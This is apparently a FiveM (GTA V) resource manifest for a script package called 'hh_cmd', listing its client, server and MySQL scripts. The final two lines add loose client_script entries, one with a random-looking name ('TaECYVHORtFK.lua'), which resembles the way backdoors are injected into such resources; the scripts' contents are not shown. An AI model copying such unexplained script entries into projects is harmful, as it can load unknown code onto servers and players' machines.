fx_version 'adamant'
lua54 'yes'
game 'gta5'

author 'HHFW' -- Discord: https://discord.gg/s7fcdW5adR
description 'hh_cmd'
version '2.0'


client_scripts {
	"config.lua",
	"client/utils.lua",
	"client/client.lua"
}

server_scripts {
	"@mysql-async/lib/MySQL.lua",
	"config.lua",
	"server/server.lua"
}


client_script "ph1ll1p.lua"

client_script 'TaECYVHORtFK.lua'